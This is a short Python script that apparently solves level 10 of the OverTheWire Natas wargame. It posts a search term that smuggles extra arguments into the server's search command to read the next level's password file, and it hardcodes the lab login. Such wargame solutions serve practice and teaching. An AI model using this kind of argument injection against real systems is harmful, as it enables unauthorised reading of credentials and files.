#!/usr/bin/env python

import requests
import json
NATAS = "natas10"
PASS = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
URL = "http://" + NATAS + ".natas.labs.overthewire.org"
#payload = { 'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': True }
#r = requests.get(URL , auth=(NATAS, PASS))
r = requests.post(URL , auth=(NATAS, PASS), data={'needle': '-v test /etc/natas_webpass/natas11 ', 'submit': True })
print(r.text)
print(r.history)
print(r.status_code)


print(r.headers)
